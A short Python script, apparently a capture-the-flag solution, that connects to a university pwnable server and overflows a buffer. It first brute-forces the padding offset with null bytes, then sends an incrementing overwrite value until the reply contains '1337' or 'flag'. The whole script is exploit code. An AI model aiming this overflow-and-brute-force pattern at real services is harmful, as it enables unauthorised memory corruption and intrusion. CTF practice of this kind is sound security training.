import socket

host = ("pwnable.ctf.hs-offenburg.de", 20000)

offset = 26

try:
    '''
    while 1:
        s = socket.socket()
        s.connect(host)
        s.send(b"\0" * offset + b"\n")
        r = s.recv(1024)
        print(r)
        if b"Value is 0" not in r:
            break
        offset += 1
        '''
    i = 0
    while 1:
        s = socket.socket()
        s.connect(host)
        payload = b'\0'*offset + bytes.fromhex(len(hex(i))%2*"0"+hex(i)[2:]) + b'9\x05\n'
        s.send(payload)
        r = s.recv(1024)
        print(r)
        if b"1337" in r or b"flag" in r:
            break
        i += 1

except KeyboardInterrupt:
    print()